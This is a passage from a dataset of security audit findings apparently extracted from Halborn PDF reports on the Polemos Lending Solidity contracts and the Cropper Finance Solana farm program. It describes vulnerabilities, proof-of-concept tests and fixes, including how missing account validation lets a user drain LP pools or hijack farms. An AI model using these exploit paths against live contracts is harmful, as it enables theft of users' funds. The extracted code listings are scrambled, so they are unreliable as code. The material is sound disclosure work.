rentalAutomatorProxy , // params . operatorOrSpender , true , // params . approved , bytes32 structHash = keccak256 ( abi . encode ( 54 ) ); bytes32 domainSeparator = rentalRecoverable . bytes memory signature = abi . encodePacked (r ,s , v); RentalPolicyArguments memory rentalPolicyArguments = bytes32 readyForSigningHash = Hasher . hashTypedDataV4 ( ( uint8 v , bytes32 r , bytes32 s) = vm . sign ( ownerPrivateKey , address (0) , // params . verifyingContract , uint256 ( OperationType . SafeTransferFrom_Erc1155 ) , 0, keccak256 ( bytes ( TRANSFER_FROM_RENTAL )) 25 26 27 28 29 30 31 32  buildDomainSeparator ( domainName , VERSION , address (  rentalAutomatorProxy )) ; 33  structHash , domainSeparator ); 34 35  readyForSigningHash ); 36 37 38  RentalPolicyArguments ( 39 40 41 42 43 44 45 46 47 48 49 50 51 52  0) ; 53  0) ; 54 55 56  RentalAutomatorFacet ( address ( rentalAutomatorProxy )).  transferFromRentalWallet ( rentalPolicyArguments , AssetType . EIP1155 ,  0, signature ); 57 58 address ( mockErc1155Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address ( rentalAutomatorProxy ) , true , address (0) , OperationType . SafeTransferFrom_Erc1155 assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 10) ; assertEq ( mockErc1155Token . balanceOf ( borrower1 , 2) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , vm . prank ( borrower1 ); ( RentalCheckResult memory rentalCheckResult ) = assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 2) , assertEq ( rentalCheckResult . success , true ); ); 55 assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( 59  PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens )); 60 61 62 63  10) ; 64  0) ; 65 } assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrower1 , 2) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 2) , Risk Level: Likelihood - 5 Impact - 5 Recommendation: is for It recommended _applyErc1155Rules() functions used within the transferFromRentalWallet() function for operation type set to SafeTransferFrom apply strict transferFromRentalWalletERC1155() validation to and rules more Remediation Plan: SOLVED: The Polemos team solved this issue in commit e8b6e08011c7f0985a64972deeb0d95c29e88cdf: () function is now supporting two different functions: - safeTransferFromRentalWalletERC1155(), - safeBatchTransferFromRentalWalletERC1155(), for transferring ERC1155 tokens basing on operation type. the transferFromRentalWallet 56 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Critical"]}, {"title": "CHECKPOLICY REVERTS FOR APPROVE ERC20 OPERATION TYPE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individ- ually. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned to- The borrower can manage the rental wallet kens to the rental wallet. off-chain, however, the list of possible actions is strictly limited. E.g. the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from RentalAutomator. The checkPolicy() makes necessary checks, including the rental wallet tokens balances and rental balances from RentedStats structure, to decide e.g. if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. The checkPolicy() function with the Approve_Erc20 operation type is called prior to increasing the allowance for the rental automator contract. This process is done before calling the returnAsset() function that transfers the rental assets from the rental wallet to the lender. However, the assessment revealed that it is not possible to call the checkPolicy() function with the Approve_Erc20 operation type, as it reverts in every case. Firstly, the function calls _preparePolicyCheckData() that returns two empty collections for the Approve_Erc20 operation type. Then these collections do not pass require assertion in _applyRules() as they have no single record required. As a result, the solution cannot return rental assets to the lender automatically. The approval process must be done then manually. 57 Code Location: Listing 15: RentalAutomator.sol (Lines 700,706,710) 693 function _preparePolicyCheckData ( 694 695 696 697 698 699 address rentalWallet , uint256 [] memory tokenIds , address tokenContract , AssetType assetType , OperationType operation ) private view returns ( uint256 [] memory totalBalances ,  uint256 [] memory claimedBalances ) { 700 701 702 703 704 705  || 706 707 708 if ( ) { ( operation >= OperationType . TransferNativeCoin && operation <= OperationType . SignTypedData ) || operation == OperationType . Unknown || operation == OperationType . SetApprovalForAll_Erc721 || operation == OperationType . SetApprovalForAll_Erc1155 operation == OperationType . Approve_Erc20 // note : do not check balances when operation is  related to erc_20_approve , set_approve_for_all 709 // or to non - token operations and , therefore , return  two empty arrays 710 711 712 713 return ( totalBalances , claimedBalances ); } // note : validate at this point only that tokenIds . length  is greater than zero 714 require ( tokenIds . length > 0,  TOKEN_IDS_ARRAY_LENGTH_IS_ZERO_ERR ); 715 716 717 718 719 720 721 722 723 724 725 726 727 totalBalances = new uint256 []( tokenIds . length ); claimedBalances = new uint256 []( tokenIds . length ); for ( uint256 i = 0; i < tokenIds . length ; i ++) { claimedBalances [ i ] = _getRentedAssetRecord ( assetType , rentalWallet , tokenContract , tokenIds [ i ] ); totalBalances [ i] = assetHandler . getBalance ( assetType , rentalWallet , 58 tokenContract , tokenIds [ i ] 728 729 730 731 732 ); } } Listing 16: LibRentalPolicyCheck.sol (Lines 52-55) ) private pure returns ( RentalCheckResult memory res ) { res = RentalCheckResult ( false , PolicyCheckResponseCode . if ( operation == OperationType . Unknown ) { return _appplyUknownOperationRules ( operation ); OperationType operation , uint256 [] memory rentalWalletTotalBalances , uint256 [] memory rentalWalletClaimedBalances , RentalPolicyArguments memory args , address automatorAddress } if ( 29 function _applyRules ( 30 31 32 33 34 35 36  Not_Checked ); 37 38 39 40 41 42 43 44 45 46  automatorAddress ); 47 } 48 49  <= OperationType . Approve_Erc20 ) { 50  strictly trying 51  ; it also means that empty arrays not allowed 52 53  rentalWalletClaimedBalances . length == 1 , 54 55 56 57 58 _applyErc20Rules ( operation , TOKEN_IDS_ARRAY_LENGTH_ERR ); return require ( ) { operation >= OperationType . TransferNativeCoin && operation <= OperationType . SignTypedData return _applyGeneralCallRules ( operation , args , rentalWalletTotalBalances . length == 1 && // note : validating at this point that the caller // to operate with a single token in case erc20 checks if ( operation >= OperationType . Transfer_Erc20 && operation 59 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 rentalWalletTotalBalances [0] , rentalWalletClaimedBalances [0] , args , automatorAddress ); } if ( ) { } if ( ) { operation >= OperationType . TransferFrom_Erc721 && operation <= OperationType . SetApprovalForAll_Erc721 return _applyErc721Rules ( operation , rentalWalletTotalBalances , rentalWalletClaimedBalances , args , automatorAddress ); operation >= OperationType . SafeTransferFrom_Erc1155 && operation <= OperationType . SetApprovalForAll_Erc1155 return _applyErc1155Rules ( operation , rentalWalletTotalBalances , rentalWalletClaimedBalances , args , automatorAddress ); } revert ( UNKNOWN_RENTAL_OPERATION_TYPE ); } Proof of Concept: below The unit Approve_Erc20 operation type. tests confirm the checkPolicy() reverts for the 60 Listing 17: HalbornERC20CheckPolicyTest.t.sol claimAssetFromLenderToBorrowerERC20 () ; function test_checkPolicy_ERC20_Approve_reverts () public { uint256 [] memory Ids = new uint256 [](1) ; uint256 [] memory ammounts = new uint256 [](1) ; Ids [0] = 0; ammounts [0] = 0; RentalPolicyArguments memory rentalPolicyArguments = 1 2 3 4 5 6 7 8  RentalPolicyArguments ( 9 10 11 12 13 14 15 16 17 18 19 20 vm . prank ( borrower1 ); 21 ( RentalCheckResult memory rentalCheckResult ) =  rentalAutomator . checkPolicy ( rentalPolicyArguments , AssetType . EIP20  ); 22 23  PolicyCheckResponseCode . Checked_When_Erc20_Operation )) ; 24 address ( mockErc20Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address ( rentalAutomator ) , true , address (0) , OperationType . Approve_Erc20 assertEq ( rentalCheckResult . success , true ); assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( ); } 61 Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to change assertions within the _applyRules() function to enable the checkPolicy() function with the Approve_Erc20 operation type. Remediation Plan: SOLVED: The Polemos team solved this issue in commit e8b6e08011c7f0985a64972deeb0d95c29e88cdf, checkPolicy() operation type. properly function works with now branch:halborn3: the Approve_Erc20 the 62 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Medium"]}, {"title": "VALID SIGNATURE CAN BE REJECTED DUE TO INTEGER UNDERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Lending solutions uses EIP-712 based signatures for authorization. Within the data used for hashing and signing, the timestamp property is given among the others. The valid period for the timestamp property is between block.timestamp - 600s and block.timestamp + 9s. However, for the timestamp property set between block.timestamp + 1s and block. timestamp + 9s the validateSignatureTimestamp() function reverts due to integer underflow. As a result, there is a 9 seconds time window, where a valid signature can be rejected by the validation algorithm. This finding is related to both Rental and Scholar solutions. Code Location: Listing 18: LibRentalParamValidator.sol (Line 108) 102 function validateSignatureTimestamp ( uint256 timestamp )  internal view { 103 104 105 /* solhint - disable - next - line not - rely - on - time */ uint256 blockTimestamp = block . timestamp ; uint256 timestampWithTreshold = blockTimestamp +  SIGNATURE_TIMESTAMP_FUTURE_TRESHOLD ; 106 require ( timestamp < timestampWithTreshold ,  SIGNATURE_TIMESTAMP_IN_FUTURE_ERR ); 107 108 require ( blockTimestamp - timestamp <=  SIGNATURE_VALIDITY_PERIOD , 109 110 111 ); } SIGNATURE_VALIDITY_PERIOD_ERR 63 Listing 19: LibScholarParamValidator.sol (Line 86) function validateSignatureTimestamp ( uint256 timestamp ) /* solhint - disable - next - line not - rely - on - time */ uint256 blockTimestamp = block . timestamp ; uint256 timestampWithTreshold = blockTimestamp + require ( timestamp < timestampWithTreshold , 80  internal view { 81 82 83  SIGNATURE_TIMESTAMP_FUTURE_TRESHOLD ; 84  SIGNATURE_TIMESTAMP_IN_FUTURE_ERR ); 85 86  SIGNATURE_VALIDITY_PERIOD , 87 88 89 require ( ); } blockTimestamp - timestamp <= SIGNATURE_VALIDITY_PERIOD_ERR Proof of Concept: 1. All necessary contracts are deployed, including RentalRecoverable, RentalAssetHandler, RentalPolicyHandler, RentalAutomator. 2. As administrator, calculate signature for SetFeeAddressParams structure. SIGNATURE_TIMESTAMP_FUTURE_TRESHOLD - 1 as value. For the timestamp property, set block.timestamp + 3. As administrator, attempt to call the setFeeAddress() function. 4. Observe the transaction reverts due to Arithmetic over/underflow error. Risk Level: Likelihood - 1 Impact - 5 64 Recommendation: It is recommended to add a condition check in the validateSignatureTimestamp () function to prevent integer underflow. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 8983dfaea6c16b11236fe576efe13805c9e74e84: the validateSignatureTimestamp () function now implements additional condition check preventing integer underflow. 65 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Medium"]}, {"title": "AUTHENTICATED UPGRADEABILITY FACET IS NOT INDEPENDENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "or the replace Lending solution implements upgradability The with diamond proxy. The DiamondCut functionality that allows to add, remove is the the RentalAuthenticatedUpgradabilityFacet contract. This contract also The assessment revealed that implements quorum-based authorization. this facet makes use of functionalities defined in other facets; thus it is not independent. It depends on three components: implemented diamonds pattern facet in  it uses getDomainSeparator() the Eip712ConfigFacet contract (inherited by the RentalAutomatorFacet contract), defined which in is  it uses the recoverReplaceAdminApprove() function which is defined in RentalRecoverableFacet.  _initEip712Config() initialize function must be called in prior to initializing domain separator, otherwise the getDomainSeparator() returns 0x0. Assuming that there is no issue within the deployment procedure, some of these functions might be either removed or replaced (in terms of both function signature and implementation) while doing an update. In such a situation, the AuthenticatedUpgradabilityFacet functionalities will not be usable anymore, and the proxy will lose the possibility to make further upgrades. The same weakness is applicable for the ScholarAuthenticatedUpgradabilityFacet . 66 Code Location: Listing 88,127,161,218,84,123,157,202,215) 20: RentalAuthenticatedUpgradabilityFacet.sol (Lines for ( uint8 i ; i < length ; ++ i ) { address currentAdmin = recoverable () . AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address [] memory signatories = new address []( length ); uint8 length = uint8 ( adminDatas . length ); _validateParamsLength ( length ); params , currentData , ADD_MODULES , eip712Config () . getDomainSeparator () 73 function addModules ( AddModulesParams memory params , AdminData []  memory adminDatas ) external { 74 75 76 77 78 79 80 81 82 83 84  recoverSignatoryAddModules ( 85 86 87 88 89 90  USER_NOT_ADMIN_ERR ); 91 92 93 94 95  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 96 97 98 99 100 101 102 103 104 105 106 107 FacetCut [] memory facetCut = new FacetCut [](1) ; facetCut [0] = FacetCut ( params . facetAddress , FacetCutAction . Add , params . selectors , params . initData ); _validateAdminAddressWithErr ( currentAdmin , _validateListContainsUniqueItemsWithErr ( signatories , ); diamondCut ( facetCut ); emit AddModules ( params , adminDatas ); signatories [i ] = currentAdmin ; } } 67 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 function removeModules ( RemoveModulesParams memory params , AdminData [] memory adminDatas ) external { uint8 length = uint8 ( adminDatas . length ); _validateParamsLength ( length ); address [] memory signatories = new address []( length ); for ( uint8 i ; i < length - 1; ++ i) { AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address currentAdmin = recoverable () .  recoverSignatoryRemoveModules ( 124 125 126 127 128 129 params , currentData , REMOVE_MODULES , eip712Config () . getDomainSeparator () ); _validateAdminAddressWithErr ( currentAdmin ,  USER_NOT_ADMIN_ERR ); 130 131 132 133 134 signatories [i ] = currentAdmin ; } _validateListContainsUniqueItemsWithErr ( signatories ,  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 135 136 137 FacetCut [] memory facetCut = new FacetCut [](1) ; facetCut [0] = FacetCut ( params . facetAddress , FacetCutAction  . Remove , params . selectors , hex \" \" ); 138 139 140 141 142 143 144 145 146 147 diamondCut ( facetCut ); emit RemoveModules ( params , adminDatas ); } function replaceModules ( ReplaceModulesParams memory params , AdminData [] memory adminDatas ) external { uint8 length = uint8 ( adminDatas . length ); 68 148 149 150 151 152 153 154 155 156 157 _validateParamsLength ( length ); address [] memory signatories = new address []( length ); for ( uint8 i ; i < length - 1; ++ i) { AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address currentAdmin = recoverable () .  recoverSignatoryReplaceModules ( 158 159 160 161 162 163 params , currentData , REPLACE_MODULES , eip712Config () . getDomainSeparator () ); _validateAdminAddressWithErr ( currentAdmin ,  USER_NOT_ADMIN_ERR ); 164 165 166 167 168 signatories [i ] = currentAdmin ; } _validateListContainsUniqueItemsWithErr ( signatories ,  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 FacetCut [] memory facetCut = new FacetCut [](1) ; facetCut [0] = FacetCut ( params . facetAddress , FacetCutAction . Replace , params . selectors , params . initData ); diamondCut ( facetCut ); emit ReplaceModules ( params , adminDatas ); } function replaceAdmin ( ReplaceAdminApproveParams memory approveParams , AdminData [] memory adminDatas , ReplaceAdminConfirmParams memory confirmParams ) external { require ( approveParams . nonce == confirmParams . nonce ,  NONCE_MISMATCH_ERR ); 69 188 189 190 191 192 193 194 DiamondStorage storage ds = state () ; uint8 length = uint8 ( adminDatas . length ); _validateParamsLength ( length ); address [] memory signatories = new address []( length ); _validateAdminAddressWithErr ( confirmParams .  currentAdminAddress , USER_NOT_OLD_ADMIN_ERR ); 195 196 197 198 199 200 201 202 validateSignatureTimestamp ( confirmParams . timestamp ); for ( uint8 i ; i < length - 1; ++ i) { AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address currentAdmin = recoverable () .  recoverReplaceAdminApprove ( 203 204 205 206 207 208 approveParams , currentData , REPLACE_ADMIN_APPROVE , eip712Config () . getDomainSeparator () ); _validateAdminAddressWithErr ( currentAdmin ,  USER_NOT_ADMIN_ERR ); 209 210 211 212 213 signatories [i ] = currentAdmin ; } _validateListContainsUniqueItemsWithErr ( signatories ,  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 214 215 address newAdmin = recoverable () .  recoverReplaceAdminConfirm ( 216 217 218 219 220 221 222 223 224 225  false ; confirmParams , REPLACE_ADMIN_CONFIRM , eip712Config () . getDomainSeparator () ); require ( newAdmin == approveParams . newAdminAddress , SIGNATORY_NOT_NEW_UPGRADABILITY_ADMIN_ERR ); ds . adminList . _isAdmin [ approveParams . currentAdminAddress ] = 70 226 ds . adminList . _isAdmin [ approveParams . newAdminAddress ] =  true ; 227  ); 228 } emit ReplaceAdmin ( approveParams , confirmParams , adminDatas Listing 21: RentalAuthenticatedUpgradabilityFacet.sol 253 function recoverable () private view returns (  IRentalRecoverable instance ) { 254 255 256 257 instance = IRentalRecoverable ( address ( this )) ; } function eip712Config () private view returns ( IBaseEip712  instance ) { 258 259 } instance = IBaseEip712 ( address ( this )); Proof of Concept: 1. Deploy RentalAutomatorProxy proxy with two facets only: RentalAuthenticatedUpgradabilityFacet and RentalAutomatorFacet. 2. Initialize the RentalAuthenticatedUpgradabilityFacet. 3. Attempt to call replaceAdmin() function. Observe that proxy attempts to call recoverReplaceAdminApprove() function and reverts with U -002: FUNCTION_NOT_EXISTS_ERR error. 71 Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to make the RentalAuthenticatedUpgradabilityFacet facet independent of other facets, so its functionality is immune to undesired effects of other facets upgrades. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 8816106151438db93aac410b04a142e3b55d32ea: the RentalAuthenticatedUpgradabilityFacet facet is now independent of other facets. 72 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Medium"]}, {"title": "DIAMOND PROXY DOES NOT SET THE ESSENTIAL VARIABLES IN THE CONSTRUCTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the Lending pattern solution implements upgradeability The by The RentalAutomatorProxy proxy accepts an array of diamond proxy. FacetCutWithoutInitData as input parameter, and then it registers all the provided facets. However, it does not initialize any of these facets (by custom implementation). Thus, between the proxys constructor call and the facets initializing function call, the solution remains unprotected. In this window, an attacker can attempt front-running the initializing function call. Alternatively, some facets might be uninitialized due to human error. The reference implementation diamond-2-hardhat sets the contract owner in the constructor, whereas in this case, the solution admin is set in the late RentalAdminFacets initializeRentalAdminFacet() function call. Also, all identified initialize functions lack any sort of authorization. The same weakness was identified in the ScholarAutomatorProxy contract. Code Location: Listing 22: RentalAutomatorProxy.sol FacetCut [] memory cutWithInitData = new FacetCut []( cut . for ( uint256 facetIndex ; facetIndex < cut . length ; ) { 17 constructor ( FacetCutWithoutInitData [] memory cut ) { 18  length ); 19 20 21 22 23 24 25 26 cut [ facetIndex ]. facetAddress , cut [ facetIndex ]. action , cut [ facetIndex ]. functionSelectors , hex \" \" cutWithInitData [ facetIndex ] = FacetCut ( ); 73 27 28 29 30 31 32 33 34 } unchecked { facetIndex ++; } } LibDiamond . diamondCut ( cutWithInitData ); _setSupportedInterfacesByDefault () ; Risk Level: Likelihood - 1 Impact - 5 Recommendation: is It recommended set contract RentalAutomatorProxy ize functions can be protected. to the essential so constructor, variables the that in the initial- Remediation Plan: RISK ACCEPTED: The Polemos team accepted the risk of this finding. Instead of setting the aforementioned variables in the constructor, the deployment script is going to handle the deployment and initialize functionality. Then, a manual process of verification will be executed. 74 3.10 (HAL-10) STAKE ASSET LACKS TOKENS WHITELISTING - LOW ", "labels": ["Halborn", "Polemos_Lending", "Severity: Informational"]}, {"title": "MISSING ACCOUNT VALIDATION LEADS TO MULTIPLE CRITICAL VULNERABILITIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The Cropper Farm program allows users to deposit LP tokens in farms and harvest rewards based on the deposit they made. Each farm is owned by an authority account which controls the farms LP token pool and the reward token pool. This authority is a PDA derived from the farm account address and the farm program ID. Whenever a user sends a transaction to the program they have to provide a number of account addresses, the most interesting of them being: 1. source token account address 2. destination token account address 3. transfer authority account address 4. fee account address All token transfers are handled by the token_transfer function defined in processor.rs. token_transfer signs all transactions with the farms authority account (the PDA) by default and uses the invoke_signed function to call the SPL Token programs process_transfer function to transfer the tokens. The invoke_signed function appends the programs signature to the transaction signers array. Because neither deposit nor withdraw functions validate addresses and ownership of the user-supplied accounts, a number of critical vulnera- bilities can be identified in the program, including: 13 1. Stealing all LP tokens in all pools A malicious user may send a Deposit, Withdraw or an AddReward instruction and replace his transfer authority account address with the farm authority account address, the source LP token account with the farms LP token account and the destination LP token account with their own account to transfer all tokens from the farm pool account to the users account. This is because the source token address is not validated not to be equal to the farm pools account address 2. Stealing handling fees A malicious user may send a PayFarmFee, Deposit or Withdraw instruction and replace the fee account address with their own account address to transfer the fee back to themselves. The program will confirm the fee has been paid successully and will keep processing the instruction logic. This is because the user-supplied fee account address is not validated to match the intended one. Code Location: Listing 1: processor.rs (Lines 782,787,788,793,800) 776 // / issue a spl_token ` Transfer ` instruction . 777 pub fn token_transfer < 'a >( pool : & Pubkey , 778 token_program : AccountInfo < 'a >, 779 source : AccountInfo <'a >, 780 destination : AccountInfo < 'a >, 781 authority : AccountInfo <'a >, 782 nonce : u8 , 783 amount : u64 , 784 785 ) -> Result <() , ProgramError > { 786 787 788 789 let pool_bytes = pool . to_bytes () ; let authority_signature_seeds = [& pool_bytes [..32] , &[ nonce ]]; let signers = &[& authority_signature_seeds [..]]; let ix = spl_token :: instruction :: transfer ( 14 790 791 792 793 794 795 796 797 798 799 800 801 802 } token_program . key , source . key , destination . key , authority . key , &[] , amount , ) ?; invoke_signed ( & ix , &[ source , destination , authority , token_program ], signers , ) 15 Examples of missing account validation in process.rs. Listing 2: process.rs 256 // authority information of this farm account 257 let authority_info = next_account_info ( account_info_iter ) ?; 258 259 // depositor 's wallet account information 260 let depositor_info = next_account_info ( account_info_iter ) ?; 261 262 // depositor 's user account information to include deposited balance , reward debt 263 let user_info_account_info = next_account_info ( account_info_iter ) ?; 264 265 // depositor 's transfer authority ( wallet address ) 266 let user_transfer_authority_info = next_account_info ( account_info_iter ) ?; 267 268 // lp token account information in the depositor ' s wallet 269 let user_lp_token_account_info = next_account_info ( account_info_iter ) ?; 270 271 // lp token account information in the farm pool 272 let pool_lp_token_account_info = next_account_info ( account_info_iter ) ?; 273 274 // reward token account information in the depositor ' s wallet 275 let user_reward_token_account_info = next_account_info ( account_info_iter ) ?; 276 277 // reward token account information in the farm pool 278 let pool_reward_token_account_info = next_account_info ( account_info_iter ) ?; 16 Harvesting rewards, paying the fee and depositing tokens. Listing 3: processor.rs (Lines 350,364,378,379,380) 335 // harvest user 's pending rewards 336 if user_info . deposit_balance > 0 { 337 338 339 340 341 342 343 if pending > 0 { // pending amount let pending : u64 = farm_pool . pending_rewards (& mut user_info ); // harvest fee for the pending reward let harvest_fee = pending * HARVEST_FEE_NUMERATOR / 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 HARVEST_FEE_DENOMINATOR ; // transfer harvest fee to fee owner Self :: token_transfer ( farm_id_info . key , token_program_info . clone () , pool_reward_token_account_info . clone () , fee_owner_info . clone () , authority_info . clone () , farm_pool . nonce , harvest_fee ) ?; // user 's real pending amount let _pending = pending - harvest_fee ; // transfer pending reward amount from reward pool to user reward token account Self :: token_transfer ( farm_id_info . key , token_program_info . clone () , pool_reward_token_account_info . clone () , user_reward_token_account_info . clone () , authority_info . clone () , farm_pool . nonce , _pending 360 361 362 363 364 365 366 367 368 369 370 } 371 372 // deposit ( stake lp token ) 373 if amount > 0 { ) ?; } 17 374 // transfer lp token amount from user ' s lp token account to pool ' s lp token pool Self :: token_transfer ( farm_id_info . key , token_program_info . clone () , user_lp_token_account_info . clone () , pool_lp_token_account_info . clone () , user_transfer_authority_info . clone () , farm_pool . nonce , amount ) ?; // update user 's deposited balance user_info . deposit_balance += amount ; 375 376 377 378 379 380 381 382 383 384 385 386 387 } Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is of paramount importance to validate the fee, source and target token account addresses to match the intended ones in order to prevent users from stealing the tokens from the pool. Remediation Plan: SOLVED: Fixed in commit bcf5da93c14b4003f61705078f0f0788af866c00. 18 ", "labels": ["Halborn", "Cropper_Finance_Farm_Solana_Program", "Severity: Critical"]}, {"title": "FARM TAKEOVER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Users call the process_initialize function to set farm parameters. When they pay the fee the farm is active and the is_allowed attribute is set to true. The process_initialize function however does not verify if the user-supplied farm account hasnt already been allowed, so it is possible for a malicious user to overwrite any farm by sending a transaction with the Initialize instruction and reset all farm parameters. This means the is_allowed property is also reset and the farms inactive again. However, because the user-supplied account with the amm_id address is not verified to be owned by the cropper-liquidity-pool program a malicious user may use a fake amm_id account with either token_a_mint or token_b_mint set to the CRP mint address and a random public key as the other of the two to takeover and overwrite all its parameters without deactivating the farm. Code Location: Listing 4: processor.rs (Lines 121) 117 // reward token 's mint account information 118 let reward_mint_info = next_account_info ( account_info_iter ) ?; 119 120 // amm account information what have lp token mint , token_a mint , token_b mint 121 let amm_id_info = next_account_info ( account_info_iter ) ?; 122 123 // spl - token program account information 124 let token_program_info = next_account_info ( account_info_iter ) ?; Listing 5: processor.rs (Lines 167,169,171,177,181,198) 160 // CRP token pairing flag 161 let mut crp_token_pairing = 0; 162 19 163 // CRP token mint address 164 let crp_pubkey = Pubkey :: from_str ( CRP_MINT_ADDRESS ). unwrap () ; 165 166 // other token mint address to check token pairing 167 let mut other_pubkey = * amm_swap . token_a_mint () ; 168 169 if * amm_swap . token_a_mint () == crp_pubkey { 170 171 172 173 } 174 175 if * amm_swap . token_b_mint () == crp_pubkey { 176 177 178 } 179 180 // check if this creator can create \" locked farms \" specified by // this is crp token pair crp_token_pairing = 1; other_pubkey = * amm_swap . token_b_mint () ; // this is crp token pair crp_token_pairing = 1; site owner 181 if crp_token_pairing == 1 { 182 if other_pubkey == Pubkey :: from_str ( USDC_MINT_ADDRESS ). unwrap () || other_pubkey == Pubkey :: from_str ( USDT_MINT_ADDRESS ). unwrap () || other_pubkey == Pubkey :: from_str ( SOL_MINT_ADDRESS ). unwrap () || other_pubkey == Pubkey :: from_str ( ETH_MINT_ADDRESS ). unwrap () { // check if creator is allowed creator // if not returns WrongCreator error if * creator_info . key ! = Pubkey :: from_str ( ALLOWED_CREATOR ). unwrap () { return Err ( FarmPoolError :: WrongCreator . into () ); } } 183 184 185 186 187 188 189 190 191 192 193 } Risk Level: Likelihood - 4 Impact - 5 20 Recommendations: It is recommended to verify if the farm hasnt been already allowed before updating its parameters. Remediation Plan: SOLVED: Fixed in commit bcf5da93c14b4003f61705078f0f0788af866c00. 21 ", "labels": ["Halborn", "Cropper_Finance_Farm_Solana_Program", "Severity: High"]}, {"title": "DELEGATE VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Among the accounts provided by farm creator on farm initialisation are the farms LP token account which serves as token pool for all users de- positing their tokens and the reward account which holds all the generated rewards. Both accounts authority is assigned to the farm authority. The process_initialise function does not validate however if those accounts do not have any delegates. It is possible for a malicious user to initialize a farm with his own address as the accounts delegate before transferring their authorities to the farm authority. Since the swap program does not support pool properties modification it is impossible to remove the delegation thus giving the malicious user full control over the deposited funds and generated rewards. Code Location: Listing 6: processor.rs (Lines 109,112) 105 // creator wallet account information 106 let creator_info = next_account_info ( account_info_iter ) ?; 107 108 // lp token account information to store lp token in the pool 109 let pool_lp_token_account_info = next_account_info ( account_info_iter ) ?; 110 111 // reward token account information to store reward token in the pool 112 let pool_reward_token_account_info = next_account_info ( account_info_iter ) ?; 113 114 // lp token ' s mint account information 115 let pool_mint_info = next_account_info ( account_info_iter ) ?; 116 117 // reward token 's mint account information 22 118 let reward_mint_info = next_account_info ( account_info_iter ) ?; Listing 7: processor.rs (Lines 205,208) 201 // initialize fee owner with predefined wallet address 202 farm_pool . fee_owner = Pubkey :: from_str ( FEE_OWNER ). unwrap () ; 203 204 // initialize lp token account to store lp token 205 farm_pool . pool_lp_token_account = * pool_lp_token_account_info . key ; 206 207 // initialize reward token account to store reward token 208 farm_pool . pool_reward_token_account = * pool_reward_token_account_info . key ; 209 210 // store nonce to authorize this farm account 211 farm_pool . nonce = nonce ; 212 213 // store lp token mint address 214 farm_pool . pool_mint_address = * pool_mint_info . key ; Risk Level: Likelihood - 4 Impact - 5 Recommendations: It is recommended to verify if the farms LP token account and reward account do not have delegates. Remediation Plan: SOLVED: Fixed in commit 21c2e5892a412f49149bb2530757737787315d0c. 23 ", "labels": ["Halborn", "Cropper_Finance_Farm_Solana_Program", "Severity: High"]}, {"title": "HARDCODED GOVERNANCE ADDRESSES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Several important governance accounts/wallets addresses are hardcoded in cropper-lp/program/src/constraints.rs and 